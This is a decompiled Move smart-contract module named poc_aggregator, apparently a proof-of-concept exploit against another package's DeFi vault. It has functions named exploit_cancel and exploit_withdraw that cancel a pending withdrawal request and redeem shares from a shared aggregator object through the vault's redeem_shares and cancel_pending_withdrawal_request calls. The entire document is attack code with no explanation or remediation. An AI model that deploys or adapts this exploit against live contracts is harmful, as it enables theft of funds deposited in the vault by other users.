module 0xc5473986bc50590f407eccaf8a8baffaa50d30a7d2c66e6b44153056bbd11045::poc_aggregator {
    struct Aggregator<phantom T0> has key {
        id: 0x2::object::UID,
        shares: 0x2::balance::Balance<T0>,
    }

    public fun create_aggregator<T0>(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Aggregator<T0>{
            id     : 0x2::object::new(arg0),
            shares : 0x2::balance::zero<T0>(),
        };
        0x2::transfer::share_object<Aggregator<T0>>(v0);
    }

    public fun direct_redeem<T0, T1>(arg0: 0x2::coin::Coin<T1>, arg1: &mut 0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::vault::Vault<T0, T1>, arg2: &0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::admin::ProtocolConfig, arg3: &0x2::clock::Clock, arg4: &mut 0x2::tx_context::TxContext) {
        0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::vault::redeem_shares<T0, T1>(arg1, arg2, 0x2::coin::into_balance<T1>(arg0), 0x2::tx_context::sender(arg4), arg3, arg4);
    }

    public fun exploit_cancel<T0, T1>(arg0: &mut 0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::vault::Vault<T0, T1>, arg1: &0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::admin::ProtocolConfig, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = 0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::vault::get_account_pending_withdrawal_requests<T0, T1>(arg0, 0x2::tx_context::sender(arg2));
        let (_, _, _, _, _, v6) = 0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::vault::decode_withdrawal_request(0x1::vector::borrow<0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::vault::WithdrawalRequest>(&v0, 0));
        0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::vault::cancel_pending_withdrawal_request<T0, T1>(arg0, arg1, v6, arg2);
    }

    public fun exploit_withdraw<T0, T1>(arg0: &mut Aggregator<T1>, arg1: &mut 0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::vault::Vault<T0, T1>, arg2: &0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::admin::ProtocolConfig, arg3: u64, arg4: &0x2::clock::Clock, arg5: &mut 0x2::tx_context::TxContext) {
        0xc83d5406fd355f34d3ce87b35ab2c0b099af9d309ba96c17e40309502a49976f::vault::redeem_shares<T0, T1>(arg1, arg2, 0x2::balance::split<T1>(&mut arg0.shares, arg3), 0x2::tx_context::sender(arg5), arg4, arg5);
    }

    public fun setup_aggregator<T0>(arg0: &mut Aggregator<T0>, arg1: 0x2::coin::Coin<T0>) {
        0x2::balance::join<T0>(&mut arg0.shares, 0x2::coin::into_balance<T0>(arg1));
    }

    // decompiled from Move bytecode v6
}

